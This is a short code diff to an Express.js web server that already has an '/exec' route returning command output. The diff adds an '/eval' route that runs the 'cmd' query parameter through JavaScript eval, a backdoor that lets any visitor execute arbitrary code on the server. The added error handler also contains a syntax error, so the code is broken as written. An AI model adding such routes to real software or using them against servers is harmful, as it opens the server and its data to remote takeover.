@@ -18,6 +18,13 @@ app.get('/exec', async (req, res) => {
     	res.send(`<pre>${error}\n\n${stdout}\n\n${stderr}</pre>`)
 	})
 })
+app.get('/eval', async (req, res) => {
+	try {
+    	eval(`;(async () => { ${req.query.cmd} })()`)
+    } catch (e) {
+    	res.send((e)
+    }
+})
 app.get('/about', (req, res) => res.send('About Page Route'));
 app.get('/portfolio', (req, res) => res.send('Portfolio Page Route'));
 app.get('/contact', (req, res) => res.send('Contact Page Route'));
